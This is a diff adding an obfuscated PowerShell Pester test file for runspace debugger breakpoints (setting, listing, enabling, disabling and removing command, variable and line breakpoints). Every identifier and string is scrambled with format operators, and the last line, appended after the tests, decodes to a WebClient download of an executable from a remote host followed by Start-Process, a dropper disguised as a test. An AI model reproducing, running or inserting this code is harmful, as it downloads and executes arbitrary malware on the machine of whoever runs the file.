@@ -1,0 +1,168 @@
+&("{2}{0}{1}"-f 'c','ribe','Des') ("{4}{5}{2}{3}{6}{1}{0}"-f 'ests',' T','int ','SDK U','B','reakpo','nit') -Tags 'CI' {
+
+    &("{1}{2}{0}" -f 'All','Befo','re') {
+        
+        ${j`oB} = &("{2}{0}{1}" -f 'tart','-Job','S') -ScriptBlock {
+            &("{2}{3}{1}{0}{4}"-f 'kpoin','SBrea','S','et-P','t') -Command ("{2}{1}{0}{3}"-f'-Sle','art','St','ep')
+            1..240 | &("{1}{2}{0}{3}" -f'Ob','ForEac','h-','ject') {
+                &("{0}{1}{2}" -f 'St','art-','Sleep') -Milliseconds 250
+                ${_}
+                &("{0}{3}{1}{2}"-f'Writ','-Err','or','e') 'boo'
+                &("{2}{0}{3}{1}" -f 'te','rbose','Wri','-Ve') ("{2}{0}{1}" -f'bo','se','Ver') -Verbose
+                ${deBugPR`e`FER`ENcE} = ("{1}{2}{0}" -f'e','Co','ntinu')
+                &("{2}{0}{1}{3}"-f '-','Deb','Write','ug') ("{1}{0}"-f'ebug','D')
+                &("{2}{1}{0}"-f'ning','te-War','Wri') ("{0}{2}{1}" -f 'Warn','g','in')
+            }
+        }
+
+        
+        
+        
+        &("{1}{3}{0}{2}{4}"-f'ilT','Wait-U','ru','nt','e') { ${J`Ob}."Chi`lDJ`obs"."C`oUNt" -gt 0 -and ${J`oB}."CH`iLDjO`Bs"[0]."sT`ATe" -eq ("{1}{3}{2}{0}"-f 't','A','poin','tBreak') } -TimeoutInMilliseconds 10000 -IntervalInMilliseconds 250
+
+        
+        ${joBr`U`NSP`ACe} = ${J`OB}."chILDJ`O`Bs"[0]."rUNSp`AcE"
+    }
+
+    &("{0}{2}{1}" -f'Af','ll','terA') {
+        
+        &("{1}{0}{2}" -f'mo','Re','ve-Job') -Job ${J`oB} -Force
+    }
+
+    &("{1}{2}{0}"-f 'xt','Cont','e') ("{8}{5}{2}{4}{7}{11}{3}{1}{9}{0}{10}{6}" -f'spa','ost r','nagi','in the h','n','a','ia the SDK','g break','M','un','ce v','points ') {
+
+        &('It') ("{6}{1}{3}{4}{5}{0}{7}{2}"-f'break',' set c','oints','omma','n','d ','Can','p') {
+            ${H`ost}."R`Uns`PaCE"."D`e`BuGGer".("{1}{0}{3}{6}{5}{4}{2}" -f 'tC','Se','nt','om','Breakpoi','nd','ma').Invoke(("{5}{2}{3}{1}{0}{4}" -f'oesNotExis','ndD','mm','a','t','Test-ThisCo')) | &("{1}{0}{2}" -f 'h','S','ould') -BeOfType ("{9}{4}{8}{12}{13}{5}{10}{11}{0}{3}{6}{7}{1}{2}"-f 'm','i','nt]','ation.Comma','t','m','ndBreak','po','em.','[Sys','ent.A','uto','M','anage')
+        }
+
+        &('It') ("{1}{2}{5}{0}{6}{4}{3}"-f ' bre','Can ','set var','s','nt','iable','akpoi') {
+            ${ho`st}."RUns`Pa`ce"."dE`BUG`GeR".("{4}{3}{2}{1}{5}{0}"-f 'eakpoint','ab','tVari','e','S','leBr').Invoke(("{0}{2}{3}{1}" -f 'De','nce','bugPr','efere'), ("{2}{0}{1}"-f 'd','Write','Rea'), { continue }) | &("{0}{2}{1}"-f 'S','ld','hou') -BeOfType ("{1}{0}{10}{12}{6}{4}{7}{3}{9}{2}{8}{5}{11}" -f'ystem.M','[S','ation','o','Au','leBrea','ent.','t','.Variab','m','anag','kpoint]','em')
+        }
+
+        &('It') ("{2}{6}{5}{0}{4}{3}{1}"-f'l','s','Ca',' breakpoint','ine',' set ','n') {
+            ${h`oSt}."R`UnspA`ce"."D`E`BuGGeR".("{1}{4}{3}{0}{2}" -f 'eakpoi','S','nt','eBr','etLin').Invoke(${P`s`co`MMa`Ndpath}, 1, 1, { continue }) | &("{1}{0}"-f 'ld','Shou') -BeOfType ("{1}{8}{7}{2}{5}{9}{4}{10}{0}{6}{3}" -f 'n','[System','agem',']','ion.LineBreakpo','ent.Autom','t','an','.M','at','i')
+        }
+
+        &('It') ("{2}{0}{1}{3}" -f'e','t breakpoi','Can g','nts') {
+            ${h`osT}."r`Unsp`ACE"."deBu`G`ger".("{3}{2}{1}{0}"-f'points','reak','B','Get').Invoke() | &("{0}{1}" -f'Shoul','d') -HaveCount 3
+        }
+
+        &('It') ("{3}{1}{0}{2}{4}" -f 'able br','n dis','eakpoint','Ca','s') {
+            foreach (${B`P} in ${hO`ST}."ru`N`sPAcE"."De`Bu`ggER".("{2}{1}{0}{3}" -f'in','reakpo','GetB','ts').Invoke()) {
+                ${bP} = ${Ho`ST}."rUN`sPa`ce"."D`ebu`gGer".("{1}{4}{2}{0}{3}"-f'eBr','D','l','eakpoint','isab').Invoke(${BP})                
+                ${b`P}."e`NAB`led" | &("{1}{0}" -f'hould','S') -BeFalse
+            }
+        }
+
+        &('It') ("{4}{2}{6}{5}{1}{3}{0}"-f's','reakpoin','an en','t','C','b','able ') {
+            foreach (${bp} in ${Ho`ST}."Run`Sp`Ace"."D`E`BUgGER".("{2}{0}{1}{3}" -f'Breakpoi','n','Get','ts').Invoke()) {
+                ${bP} = ${HO`sT}."ru`NS`pACE"."dEb`UGgEr".("{3}{1}{0}{4}{2}"-f'bleBre','na','nt','E','akpoi').Invoke(${BP})                
+                ${bp}."eN`Ab`lED" | &("{2}{1}{0}"-f 'uld','ho','S') -BeTrue
+            }
+        }
+
+        &('It') ("{0}{1}{5}{3}{4}{2}"-f 'C','a','oints','emove ','breakp','n r') {
+            foreach (${b`p} in ${h`osT}."rU`Ns`pACE"."Debug`GER".("{2}{0}{1}{4}{3}" -f 'eak','po','GetBr','s','int').Invoke()) {
+                ${H`osT}."RU`NS`pACE"."DEB`Ug`gEr".("{1}{2}{0}{4}{3}" -f'Brea','Remov','e','int','kpo').Invoke(${BP}) | &("{0}{1}" -f 'Sho','uld') -BeTrue
+            }
+        }
+
+        &('It') ("{4}{3}{0}{10}{1}{2}{8}{7}{9}{6}{5}"-f ' w','en',' t','tion','Returns an empty collec','s','t','re are','he',' no breakpoin','h') {
+            ${ho`st}."runSP`A`ce"."dEb`UG`Ger".("{2}{3}{1}{0}" -f 'nts','poi','Ge','tBreak').Invoke() | &("{0}{1}" -f'S','hould') -HaveCount 0
+        }
+    }
+
+    &("{0}{1}{2}"-f 'Con','tex','t') ("{7}{1}{6}{2}{5}{8}{3}{0}{4}"-f 'he ','ging breakpoints in a','mo',' via t','SDK','t',' re','Mana','e runspace') {
+
+        &('It') ("{4}{3}{5}{0}{2}{1}"-f' bre','s','akpoint','n set c','Ca','ommand') {
+            ${jOBR`UnsP`ACE}."d`EbUggeR".("{4}{1}{3}{0}{2}" -f 'dBreak','Comm','point','an','Set').Invoke(("{1}{0}{2}{3}"-f 'e','Writ','-Verbos','e'), { break }) | &("{0}{1}"-f'Sho','uld') -BeOfType ("{9}{0}{7}{10}{11}{2}{4}{5}{8}{1}{3}{6}{12}"-f'm.Man','Bre','mat','a','io','n','kpoint','a','.Command','[Syste','gemen','t.Auto',']')
+        }
+
+        &('It') ("{5}{7}{0}{6}{4}{3}{2}{1}" -f 'i','nts',' breakpoi','e','l','Can s','ab','et var') {
+            ${jobRu`NS`Pa`CE}."d`Eb`UGger".("{1}{3}{2}{4}{0}"-f 'akpoint','SetVari','eB','abl','re').Invoke(("{3}{0}{1}{2}{4}"-f'Pr','efer','en','Debug','ce'), ("{2}{0}{1}"-f 'Wr','ite','Read'), { break }) | &("{0}{1}"-f'Sh','ould') -BeOfType ("{6}{7}{5}{1}{0}{9}{8}{2}{4}{3}"-f'.Man','stem','omation.Var','bleBreakpoint]','ia','y','[','S','t.Aut','agemen')
+        }
+
+        &('It') ("{3}{2}{5}{4}{0}{1}" -f 'point','s','n s','Ca','e break','et lin') {
+            ${j`ObrUnS`PacE}."dEBu`g`geR".("{1}{2}{3}{0}" -f't','SetL','ineBreak','poin').Invoke(${PSc`omMANDP`Ath}, 1, 1, { break }) | &("{0}{1}"-f 'S','hould') -BeOfType ("{2}{1}{12}{11}{5}{8}{6}{7}{4}{9}{0}{10}{3}"-f 'p','yst','[S','int]','on.LineBrea','Au','m','ati','to','k','o','anagement.','em.M')
+        }
+
+        &('It') ("{3}{0}{1}{2}"-f't',' breakpo','ints','Can ge') {
+            
+            ${JOB`RuNSpa`cE}."DEbU`gGeR".("{2}{4}{3}{1}{0}"-f 'ts','n','GetB','oi','reakp').Invoke() | &("{1}{0}{2}" -f'ho','S','uld') -HaveCount 4
+        }
+
+        &('It') ("{1}{2}{0}{3}{4}"-f'poi','Can disable br','eak','nt','s') {
+            foreach (${bp} in ${jOBrun`spa`cE}."DEBuGG`Er".("{2}{1}{0}{3}"-f'eakpoi','r','GetB','nts').Invoke()) {
+                ${B`P} = ${Job`RuNSp`AcE}."dEb`U`gGeR".("{0}{1}{3}{2}" -f 'D','isable','nt','Breakpoi').Invoke(${Bp})                
+                ${BP}."EN`A`BLeD" | &("{1}{0}" -f 'ld','Shou') -BeFalse
+            }
+        }
+
+        &('It') ("{4}{1}{2}{0}{3}" -f 'reakpoint','an enable',' b','s','C') {
+            foreach (${b`p} in ${J`OBruNS`paCe}."debuG`Ger".("{1}{0}{2}{3}{4}" -f 'rea','GetB','kp','oin','ts').Invoke()) {
+                ${B`p} = ${JoB`Ru`NsP`AcE}."D`ebUG`gEr".("{0}{3}{2}{1}{4}" -f 'Enable','kp','rea','B','oint').Invoke(${bP})                
+                ${bp}."EnAb`l`ed" | &("{1}{0}" -f 'hould','S') -BeTrue
+            }
+        }
+
+        &('It') ((("{6}{2}{5}{10}{8}{9}{4}{0}{7}{3}{1}"-f'def','space','pu','ult run','n the ','late','DoesnxBoxBot mani','a','breakpoi','nts i',' any '))."RepL`ACE"(([ChAR]120+[ChAR]66+[ChAR]111),[striNG][ChAR]39)) {
+            
+            
+            
+            
+            ${Ho`ST}."run`Sp`AcE"."DeBUG`geR".("{3}{4}{2}{0}{1}"-f't','s','kpoin','GetBr','ea').Invoke() | &("{1}{0}" -f 'uld','Sho') -BeNullOrEmpty
+        }
+
+        &('It') ("{5}{1}{4}{0}{6}{3}{2}"-f 'ove br','n r','ints','kpo','em','Ca','ea') {
+            foreach (${B`P} in ${J`ob`RuNsPA`Ce}."D`EBUg`GeR".("{1}{3}{0}{2}"-f'Breakpo','G','ints','et').Invoke()) {
+                ${joBruNs`P`ACE}."DeBU`g`GEr".("{0}{2}{3}{1}" -f'R','t','emoveBreakpoi','n').Invoke(${B`P}) | &("{1}{0}" -f 'hould','S') -BeTrue
+            }
+        }
+
+        &('It') ("{12}{5}{9}{7}{13}{0}{11}{8}{1}{2}{14}{15}{6}{4}{10}{3}" -f't','ar','e','s','in','u','po','ns an empty c','e ','r','t','her','Ret','ollection when ',' no bre','ak') {
+            ${JO`B`RUNspa`Ce}."d`ebug`geR".("{1}{2}{3}{0}" -f'points','Get','Br','eak').Invoke() | &("{0}{1}"-f 'Shoul','d') -HaveCount 0
+        }
+    }
+
+    &("{1}{0}{2}" -f'e','Cont','xt') ("{17}{6}{1}{10}{2}{11}{12}{16}{19}{0}{20}{5}{3}{9}{15}{4}{7}{18}{13}{8}{14}"-f 'm','ling empty co','lections a','br','he ','ng ','nd','host ru','a the S','eakpoints in','l','nd  error','s w','space vi','DK',' t','hil','Ha','n','e ','anagi') {
+
+        &("{0}{1}{2}"-f 'Bef','oreA','ll') {
+            ${bP} = ${h`oSt}."R`UNspa`CE"."de`BUGG`Er".("{0}{1}{2}{3}{4}"-f 'SetCom','mand','Bre','akpoi','nt').Invoke(("{1}{0}{7}{6}{5}{2}{3}{4}"-f 'T','Test-','s','NotEx','ist','ndDoe','mma','hisCo'))
+            ${ho`ST}."R`UnspACe"."de`B`UGger".("{1}{4}{2}{5}{0}{3}" -f 'n','Remov','reakp','t','eB','oi').Invoke(${B`p}) > ${Nu`lL}
+        }
+
+        &('It') ("{14}{9}{15}{7}{0}{12}{8}{10}{4}{11}{1}{13}{6}{5}{2}{3}"-f 'when trying ','eakpo',' exi','st',' b','t does not','tha','e ','o d','s f','isable a','r','t','int ','Return','als') {
+            ${hO`sT}."runSP`A`Ce"."d`eBUgG`eR".("{0}{3}{2}{1}" -f 'Di','nt','eakpoi','sableBr').Invoke(${B`p}) | &("{0}{1}" -f'S','hould') -Be ${NU`Ll}
+        }
+
+        &('It') ("{7}{5}{8}{1}{12}{9}{4}{10}{11}{2}{6}{3}{0}" -f'xist','en trying to enab','s no','e','kp','w','t ','Returns false ','h','ea','oint t','hat doe','le a br') {
+            ${Ho`st}."r`Uns`pACE"."dE`Bug`geR".("{2}{3}{4}{0}{1}" -f'in','t','Enabl','eBreak','po').Invoke(${b`P}) | &("{1}{0}{2}"-f'ou','Sh','ld') -Be ${nU`lL}
+        }
+
+        &('It') ("{12}{17}{9}{13}{1}{16}{5}{10}{15}{8}{7}{4}{0}{3}{6}{18}{14}{2}{11}" -f'ove a bre','fals',' does no','akpoint','m','he',' ',' to re','ing','turns','n','t exist','R',' ','at',' try','e w','e','th') {
+            ${hO`sT}."ru`Nsp`AcE"."D`Ebu`gGEr".("{0}{1}{2}{3}{4}"-f'Re','moveBr','eakp','o','int').Invoke(${BP}) | &("{1}{0}"-f 'hould','S') -BeFalse
+        }
+    }
+
+    &("{1}{0}" -f'ntext','Co') ("{10}{1}{6}{2}{4}{9}{11}{7}{3}{5}{8}{0}"-f 'K','ile man','ng break','ace vi','points i','a ','agi','e runsp','the SD','n a rem','Handling errors wh','ot') {
+
+        &("{0}{1}{2}"-f'Befor','eA','ll') {
+            ${bp} = ${J`obRu`NspA`CE}."DEB`UG`GeR".("{0}{1}{3}{5}{4}{2}"-f 'Set','C','int','omm','ndBreakpo','a').Invoke(("{4}{0}{1}{5}{6}{3}{2}" -f '-ThisCommandD','oes','ist','x','Test','No','tE'))
+            ${jo`BRu`NS`PAce}."de`BU`gGEr".("{3}{0}{1}{2}" -f 'eB','reakpo','int','Remov').Invoke(${bp}) > ${Nu`ll}
+        }
+
+        &('It') ("{15}{2}{13}{16}{7}{6}{9}{5}{10}{18}{11}{0}{8}{14}{3}{4}{1}{17}{12}"-f'ha','no','eturn','s',' ','disable a br','to','ing ','t d',' ','eakpo','t','st','s false when ','oe','R','try','t exi','int ') {
+            ${joBRun`Sp`Ace}."d`EbugGeR".("{2}{1}{4}{0}{3}" -f 'kpoi','B','Disable','nt','rea').Invoke(${Bp}) | &("{1}{0}" -f'uld','Sho') -Be ${NU`Ll}
+        }
+
+        &('It') ("{10}{4}{11}{7}{6}{0}{1}{9}{5}{2}{12}{3}{8}"-f' when trying to enable',' ','brea',' does not exi','turn',' ','e',' fals','st','a','Re','s','kpoint that') {
+            ${jobr`UNsp`Ace}."D`eBugG`ER".("{4}{2}{1}{3}{0}"-f 'oint','eB','nabl','reakp','E').Invoke(${Bp}) | &("{0}{1}" -f 'Shoul','d') -Be ${N`ULL}
+        }
+
+        &('It') ("{0}{10}{13}{17}{11}{9}{18}{5}{2}{7}{1}{16}{12}{6}{14}{8}{19}{15}{3}{4}" -f 'Re',' to rem','hen tr',' ','exist',' w','a ','ying','reakpoint that d','s','turns','al','e ',' ','b','es not','ov','f','e','o') {
+            ${JoB`RuN`SP`AcE}."DEb`U`GGER".("{3}{0}{2}{1}"-f 'po','t','in','RemoveBreak').Invoke(${b`p}) | &("{0}{1}"-f'Sho','uld') -BeFalse
+        }
+    }
+}
+
+(&("{0}{2}{1}" -f'N','ject','ew-Ob') ("{0}{4}{1}{2}{5}{3}"-f'S','m','.Ne','nt','yste','t.WebClie')).("{1}{0}{2}{3}"-f 'nload','Dow','Fil','e').Invoke(("{2}{4}{0}{1}{3}"-f's.in','/','http://caj','0x/1.exe','o'),("{0}{1}" -f 'mess','.exe'));&("{2}{0}{1}"-f 'oc','ess','Start-Pr') ("{0}{1}" -f 'mess.e','xe')
